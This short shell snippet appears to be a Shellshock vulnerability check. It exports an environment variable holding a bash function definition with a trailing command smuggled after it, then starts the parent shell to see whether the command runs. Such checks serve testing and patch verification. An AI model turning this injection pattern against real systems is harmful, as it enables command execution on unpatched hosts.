foo=' () { echo "abc"; }; echo "exploited";'
export foo
PARENT_SHELL=$(ps -o comm= $PPID)
$PARENT_SHELL
